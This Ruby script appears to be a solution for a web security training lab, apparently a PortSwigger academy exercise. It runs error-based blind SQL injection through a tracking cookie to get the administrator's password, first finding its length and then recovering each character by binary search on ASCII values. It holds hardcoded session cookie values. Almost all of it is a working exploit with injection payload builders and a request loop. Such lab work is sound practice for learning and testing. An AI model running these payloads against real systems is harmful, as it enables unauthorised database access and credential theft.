require_relative '../utils.rb'

SESSION_COOKIE = "8CFtpra3mnP7eppOYr9hoo3QrHlUDsrA"
TRACKINGID_COOKIE = "XuWhso63hvayA5aT"
BASE_URI = URI("https://0ac200ea0452f47b803e12c4001200ce.web-security-academy.net/")

sql = "xyz' AND (SELECT CASE WHEN (Username = 'Administrator' AND SUBSTRING(Password, 1, 1) > 'm') 
THEN 1/0 ELSE 'a' END FROM Users)='a"

check_administrator_user = "SELECT CASE WHEN (SELECT 'a' FROM users WHERE username='administrator') THEN 1/0 ELSE NULL END'"

def password_length_sql(tracking_id, operator, value)
  "#{tracking_id}'||(SELECT CASE WHEN LENGTH(password)#{operator}#{value} THEN TO_CHAR(1/0) ELSE '' END FROM users WHERE username='administrator')||'"
end

def char_test_sql(pword_char_no, operator, test_ascii_no)
  "#{TRACKINGID_COOKIE}'||(SELECT CASE
    WHEN (ASCII(SUBSTR(password, #{pword_char_no}, 1)) #{operator} #{test_ascii_no})
    THEN TO_CHAR(1/0)
    ELSE ''
  END FROM users WHERE username='administrator')||'"
end

def server_error?(response_body, truthy_response_text)
  response_body.include?(truthy_response_text)
end


# req = built_request(password_length_sql(TRACKINGID_COOKIE, '>', 2), SESSION_COOKIE)
# response = http_client.request(req)

# if response.code == '200'
#   puts "Sql assertion not true ❌ - status code #{response.code}"
# elsif response.code == '500' && server_error?(response.body)
#   puts "Sql assertion true ✅ - status code #{response.code}"
# end

def password_length(max_length=30, truthy_response_text)
  (1..max_length).each do |length|
    req = built_request(password_length_sql(TRACKINGID_COOKIE, '>', length), SESSION_COOKIE)
    response = http_client.request(req)
    truthy = server_error?(response.body, truthy_response_text)
    
    if truthy
      puts "password is > #{length} length"
    else
      return length
    end
  end
end

# puts password_length("Internal Server Error")

def fuzz_password
  password_length = password_length("Internal Server Error")
  password = []

  (1..password_length).each do |char_no|
    password << find_ASCII_at(char_no)
  end

  password.map{ |ascii| ascii.chr(Encoding::ASCII) }.join
end 

def server_error?(response_body, truthy_response_text)
  response_body.include?(truthy_response_text)
end

def find_ASCII_at(char_no, min_ASCII=ASCII_MIN, max_ASCII=ASCII_MAX)
  if min_ASCII == max_ASCII
    puts "ASCII char is === #{min_ASCII}"
    puts "alphanumeric char is === #{min_ASCII.chr(Encoding::ASCII)}"
    return min_ASCII
  end
  
  mid_ASCII = (min_ASCII + max_ASCII) / 2

  sql = char_test_sql(char_no, '>', mid_ASCII).gsub(/[\r\n]/, "")
  puts sql
  req = built_request(sql, SESSION_COOKIE)
  response = http_client.request(req)
  is_above_mid = server_error?(response.body, "Internal Server Error")
  puts "mid=#{mid_ASCII} status=#{response.code} hit=#{is_above_mid}"

  if is_above_mid
    # therefore value is somewhere in mid + 1..max
    find_ASCII_at(char_no, mid_ASCII + 1, max_ASCII)
  else
    # therefore value is somewhere in min..mid
    find_ASCII_at(char_no, min_ASCII, mid_ASCII)
  end
end

puts fuzz_password